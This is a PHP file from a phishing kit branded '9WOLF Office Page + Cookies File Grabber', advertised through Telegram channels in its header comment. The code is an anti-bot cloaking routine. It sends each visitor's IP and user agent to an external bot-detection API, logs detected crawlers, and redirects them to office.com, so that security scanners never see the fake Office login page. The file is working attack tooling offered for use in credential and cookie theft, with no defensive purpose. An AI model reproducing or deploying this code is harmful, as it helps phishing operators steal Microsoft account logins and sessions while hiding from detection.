<?php

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(0);
if($KillBot == "on") {
    $WOLFRemoteIp = getIP();
    $WOLFUserAgent = urlencode($_SERVER["HTTP_USER_AGENT"]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ("https://killbot.org/api/v2/blocker?ip=" . $WOLFRemoteIp . "&apikey=" . $kill_bot_api . "&ua=" . $WOLFUserAgent . "&url=" . $_SERVER['REQUEST_URI']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $answer = curl_exec($ch);
    curl_close($ch);
    $result = $answer;
    if($result->{'data'}->{'block_access'} == true) {
        $message = ("9WOLF D3cl!n3d =>  [ K!!ll B0t 4nt!B0t ] :".$_SERVER['HTTP_USER_AGENT']."\n !p: ".$WOLFRemoteIp." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
        header("Location: https://office.com");exit();
    }
    elseif($result->{'data'}->{'is_bot'} == true) {
        $message = ("9WOLF D3cl!n3d =>  [ K!!ll B0t 4nt!B0t ] :".$_SERVER['HTTP_USER_AGENT']."\n !p: ".$WOLFRemoteIp." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
        header("Location: https://office.com");exit();
    }
    
}

?>